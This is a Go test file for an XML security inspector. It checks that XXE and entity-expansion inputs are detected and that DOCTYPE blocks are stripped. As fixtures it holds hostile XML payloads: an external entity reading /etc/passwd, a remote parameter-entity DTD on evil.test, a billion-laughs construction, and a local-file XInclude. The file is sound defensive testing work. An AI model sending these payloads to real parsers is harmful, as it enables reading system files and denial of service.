package main

import (
	"bytes"
	"strings"
	"testing"
)

func xenHas(fs []XENFinding, reason string) bool {
	for _, f := range fs {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestXENCleanMetadata(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<?xml version="1.0"?><metadata><groupId>x</groupId></metadata>`)
	safe, fs := XENInspect(xml, pol)
	if !safe {
		t.Fatalf("clean xml should be safe, got %v", fs)
	}
}

func TestXENExternalEntityFile(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`)
	safe, fs := XENInspect(xml, pol)
	if safe {
		t.Fatal("expected unsafe for file entity")
	}
	if !xenHas(fs, XENReasonExternalEntity) {
		t.Fatal("want external entity")
	}
	if !xenHas(fs, XENReasonExternalURIScheme) {
		t.Fatal("want external uri scheme")
	}
}

func TestXENHTTPExternalEntity(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.test/x.dtd">]><r/>`)
	_, fs := XENInspect(xml, pol)
	if !xenHas(fs, XENReasonExternalEntity) || !xenHas(fs, XENReasonParameterEntity) {
		t.Fatalf("want external + parameter entity, got %v", fs)
	}
}

func TestXENPublicEntity(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<!DOCTYPE r PUBLIC "-//OASIS//DTD X//EN" "http://x/x.dtd"><r/>`)
	_, fs := XENInspect(xml, pol)
	if !xenHas(fs, XENReasonPublicEntity) {
		t.Fatalf("want public entity, got %v", fs)
	}
}

func TestXENBillionLaughs(t *testing.T) {
	pol := DefaultXENPolicy()
	var sb strings.Builder
	sb.WriteString(`<!DOCTYPE lolz [`)
	for i := 0; i < 12; i++ {
		sb.WriteString("<!ENTITY lol" + itoaXENTest(i) + ` "lol0lol0">`)
	}
	sb.WriteString(`]><z>&lol;</z>`)
	_, fs := XENInspect([]byte(sb.String()), pol)
	if !xenHas(fs, XENReasonEntityExpansion) {
		t.Fatalf("want entity expansion risk, got %v", fs)
	}
}

func TestXENXInclude(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///x"/></root>`)
	_, fs := XENInspect(xml, pol)
	if !xenHas(fs, XENReasonXInclude) {
		t.Fatalf("want xinclude, got %v", fs)
	}
}

func TestXENUnclosedDOCTYPE(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<!DOCTYPE foo [<!ENTITY x SYSTEM "http://x"> <foo/>`)
	_, fs := XENInspect(xml, pol)
	if !xenHas(fs, XENReasonUnclosedDOCTYPE) {
		t.Fatalf("want unclosed doctype, got %v", fs)
	}
}

func TestXENCaseInsensitive(t *testing.T) {
	pol := DefaultXENPolicy()
	xml := []byte(`<!doctype x [<!ENTITY e SYSTEM "http://x">]><x/>`)
	_, fs := XENInspect(xml, pol)
	if !xenHas(fs, XENReasonDOCTYPE) {
		t.Fatal("doctype detection must be case insensitive")
	}
}

func TestXENStripRemovesDOCTYPE(t *testing.T) {
	in := []byte(`<a/><!--c--><!DOCTYPE foo [<!ENTITY x SYSTEM "http://x">]><b/>`)
	out := XENStripDOCTYPE(in)
	if bytes.Contains(bytes.ToLower(out), []byte("<!doctype")) {
		t.Fatalf("doctype not stripped: %s", out)
	}
	if !bytes.Contains(out, []byte("<a/>")) || !bytes.Contains(out, []byte("<b/>")) {
		t.Fatal("valid content lost")
	}
}

func TestXENStripUnclosed(t *testing.T) {
	in := []byte(`<a/><!DOCTYPE foo [<!ENTITY x SYSTEM "http://x">`)
	out := XENStripDOCTYPE(in)
	if bytes.Contains(bytes.ToLower(out), []byte("entity")) {
		t.Fatal("unclosed doctype tail should be dropped")
	}
	if !bytes.Contains(out, []byte("<a/>")) {
		t.Fatal("prefix content lost")
	}
}

func TestXENPolicyAllowsDOCTYPE(t *testing.T) {
	pol := DefaultXENPolicy()
	pol.RejectDOCTYPE = false
	xml := []byte(`<!DOCTYPE html><html></html>`)
	safe, _ := XENInspect(xml, pol)
	if !safe {
		t.Fatal("plain doctype without entities should be safe when tolerated")
	}
}

func itoaXENTest(i int) string {
	if i == 0 {
		return "0"
	}
	var b []byte
	for i > 0 {
		b = append([]byte{byte('0' + i%10)}, b...)
		i /= 10
	}
	return string(b)
}
